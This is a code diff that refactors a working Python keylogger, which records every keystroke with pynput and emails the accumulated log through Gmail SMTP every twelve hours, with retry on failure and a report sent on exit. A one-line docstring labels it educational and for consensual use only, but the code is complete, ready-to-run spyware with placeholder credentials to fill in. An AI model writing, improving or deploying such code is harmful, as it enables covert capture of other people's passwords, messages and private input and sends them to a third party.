@@ -1,44 +1,93 @@
-#!usr/bin/env python
-from pynput import keyboard
-import threading
-import smtplib
+#!/usr/bin/env python3
+"""
+Educational Keylogger (FOR PERSONAL / CONSENSUAL USE ONLY)
+Sends keystrokes via Gmail every 12 hours.
+"""
 
-log = ""   #variable to contain the key-presses
+import smtplib
+import threading
+import sys
+from email.message import EmailMessage
+from pynput import keyboard
+
+# ============================= CONFIGURATION =============================
+EMAIL_ADDRESS = "your.email@gmail.com"          # CHANGE THIS
+APP_PASSWORD  = "abcd efgh ijkl mnop"           # CHANGE: 16-char App Password
+REPORT_INTERVAL = 12 * 60 * 60                  # 12 hours
+# =========================================================================
+
+log = ""
+lock = threading.Lock()
+
 def on_press(key):
     global log
-    #error handling
     try:
-        log = log + str(key.char)
+        char = key.char
+        if char:
+            with lock:
+                log += char
+            return
     except AttributeError:
-        if key == key.backspace:
-            log = log[:-1]
-        elif key == key.space:
-            log = log + " "
-        elif key == key.shift or key == key.shift_r or key == key.ctrl_l or key == key.ctrl_r or key == key.left or key == key.right or key == key.up or key == key.down:
-            log = log
-        else:
-            log = log + " " + str(key) + " "
-    #print(log)
+        pass
 
-def report():
+    special = {
+        keyboard.Key.space: " ",
+        keyboard.Key.enter: "\n",
+        keyboard.Key.tab: "\t",
+        keyboard.Key.backspace: "",
+    }
+
+    with lock:
+        if key == keyboard.Key.backspace:
+            log = log[:-1]
+        elif key in special:
+            log += special[key]
+        else:
+            log += f" [{key.name}] "
+
+def send_report():
     global log
-    #print(log)
-    mail()
-    timer = threading.Timer(43200, report)
+    with lock:
+        current_log = log.strip()
+        log = ""
+
+    if not current_log:
+        schedule_next()
+        return
+
+    msg = EmailMessage()
+    msg["From"] = EMAIL_ADDRESS
+    msg["To"] = EMAIL_ADDRESS
+    msg["Subject"] = "Keylogger Report"
+    msg.set_content(current_log)
+
+    try:
+        with smtplib.SMTP("smtp.gmail.com", 587) as server:
+            server.starttls()
+            server.login(EMAIL_ADDRESS, APP_PASSWORD)
+            server.send_message(msg)
+        print(f"Report sent ({len(current_log)} chars).")
+    except Exception as e:
+        print(f"Mail failed: {e}", file=sys.stderr)
+        with lock:
+            log = current_log + log
+
+    schedule_next()
+
+def schedule_next():
+    timer = threading.Timer(REPORT_INTERVAL, send_report)
+    timer.daemon = True
     timer.start()
 
-def mail():
-    global log
-    email = "example@gmail.com"
-    s = smtplib.SMTP('smtp.gmail.com', 587)
-    s.starttls()
-    s.login(email, "passkey")
-    message = log
-    s.sendmail(email, email, message)
-    s.quit()
+def main():
+    schedule_next()
+    print("Keylogger started. Press Ctrl+C to stop.")
+    with keyboard.Listener(on_press=on_press) as listener:
+        try:
+            listener.join()
+        except KeyboardInterrupt:
+            print("\nStopping...")
+            send_report()
 
-
-#listener to monitor the keyboard keys
-with keyboard.Listener(on_press=on_press) as listener:
-    report()
-    listener.join()
+if __name__ == "__main__":
+    main()
